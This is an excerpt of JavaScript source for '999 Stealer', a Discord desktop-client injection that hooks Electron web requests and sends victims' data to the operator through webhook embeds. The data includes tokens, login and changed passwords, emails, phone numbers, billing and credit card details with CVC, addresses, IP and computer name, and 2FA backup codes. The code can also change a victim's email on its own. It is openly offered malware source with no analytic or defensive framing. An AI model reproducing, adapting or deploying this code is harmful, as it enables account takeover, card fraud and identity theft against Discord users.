...
const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
  var params = {
    username: "999 Stealer",
    avatar_url:
      "https://media.giphy.com/media/26uf0M7Rs0TyBC0mc/giphy.gif",
    content: "",
    embeds: [
      {
        title: title,
        ...
        footer: {
          text: ` [${config.creator}] | discord.gg/999S`,
        },
      },
    ],
  };
...
const FirstTime = async () => {
  ...
  if (fs.existsSync(__dirname + "/NineNineNine")) {
    try {
      fs.rmdirSync(__dirname + "/NineNineNine");
    } catch (err) {}
    var ip = await getIP();
    console.log(ip);
    ...
    if (!token) {
      var params = await makeEmbed({
        title: "<a:tenor3:1247187135077810279>  999 Stealer Initialized",
        fields: [
          {
            name: "Injection Info",
      ...
      var params = await makeEmbed({
        ...
        fields: [
          ...
          {
            name: "ID <a:4297_black_ribbon:1236873734128799814> ",
            value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
            inline: !0,
          },
          {
            name: "Nitro <a:372108630_DISCORD_LOGO_BLACK_400:1236872008139018261>",
            value: `${GetNitro(Nitro)}`,
            inline: !0,
          },
          {
            name: "Badges <a:black_emojis5:1236871118237728799>   ",
          ...
          {
            name: "Billing <a:star_black:1236871122650136587>",
            value: `${Billings}`,
            inline: !0,
          },
          {
          ...
          {
            name: "Bio <a:tenor3:1247187135077810279> ",
            value: `\`\`\`${
          ...
          {
            name: "<a:g_black_atomo_PDT:1236873737060487228>  Token",
      ...
      var params2 = await makeEmbed({
        title: `<a:stars_black:1236873738340007938>  Total Friends (${Friends.len})`,
        color: config["embed-color"],
    ...
    if (
      ...
      if (!token) {
        var params = await makeEmbed({
          title:
            "<a:tenor3:1247187135077810279>  999 Stealer User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
        ...
        var params = await makeEmbed({
          title:
            "<a:tenor3:1247187135077810279>  999 Stealer Victim got logged out",
    ...
    switch (true) {
        ...
        if (!token) {
          await electron.session.defaultSession.webRequest.onCompleted(
            ...
            async (re, callback) => {
              ...
              var params = await makeEmbed({
                title: "<a:tenor3:1247187135077810279>  999 Stealer User Login",
                color: config["embed-color"],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [
                  {
                  ...
                  {
                    name: "<:Staff_Team:1240421024001032273>  Password",
                    value: `\`${password}\``,
                    inline: !0,
                  },
                  {
                  ...
                  {
                    name: "Code 2fa used <a:tenor3:1247187135077810279> ",
                    value: `\`\`\`${
                      dt.code !== null &&
                      dt.code !== undefined &&
                      dt.code !== ""
      ...
      case request.url.endsWith("users/@me"):
        ...
        if (data.new_password) {
          var params = await makeEmbed({
            title:
              "<a:tenor3:1247187135077810279>  999 Stealer Detect Password Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
              ...
              {
                name: "<:Staff_Team:1240421024001032273>  Old Password",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
                name: "<:Staff_Team:1240421024001032273>  New Password",
          ...
          if (config.changeMailAuto == "true") {
            ...
            try {
              ...
              if (res.username) {
                var params = await makeEmbed({
                  title:
                    "<a:tenor3:1247187135077810279>  999 Stealer Have changed the victim mail",
                  color: config["embed-color"],
                  description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                  fields: [
                    {
          ...
          var params = await makeEmbed({
            title:
              "<a:tenor3:1247187135077810279>  999 Stealer Detect Email Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
              ...
              {
                name: "Phone <a:Black_Wand:1236873735395348512> ",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "<:memeified_monster_green:1218929027184853072>  Password",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
        ...
        if (CardNumber && CardCVC && month && year) {
          await electron.session.defaultSession.webRequest.onCompleted(
            ...
            async (re, callback) => {
              ...
              var params = await makeEmbed({
                title:
                  "<a:tenor3:1247187135077810279>  999 Stealer User Credit Card Added",
                color: config["embed-color"],
                fields: [
                  {
                    name: "999 Files",
                  ...
                  {
                    name: "Address <a:4297_black_ribbon:1236873734128799814> ",
                    value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Credit Card <a:4297_black_ribbon:1236873734128799814> ",
      ...
      case request.url.endsWith("/enable"):
        ...
        var params = await makeEmbed({
          title: "<a:tenor3:1247187135077810279>  999 Stealer User Enable 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "999 Files",
            ...
            {
              name: "Backups Code <a:4297_black_ribbon:1236873734128799814> ",
              value: `\`\`\`md\n${backup_codes
                .map((x) => `- ${x}`)
                .join("\n")}\`\`\``,
              inline: false,
      ...
      case request.url.endsWith("/disable"):
        var params = await makeEmbed({
          title: "<a:tenor3:1247187135077810279>  999 Stealer User Removed 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "999 Files",
      ...
      case request.url.endsWith("/codes-verification"):
        ...
        var params = await makeEmbed({
          title: "<a:tenor3:1247187135077810279>  999 Stealer User 2FA Codes",
          color: config["embed-color"],
          fields: [
            {
              name: "999 Files",
            ...
            {
              name: "Backup Codes <a:4297_black_ribbon:1236873734128799814> ",
              value: `\`\`\`md\n${backup_code
                .map((x) => `- ${x}`)
                .join("\n")}\`\`\``,
              inline: false,
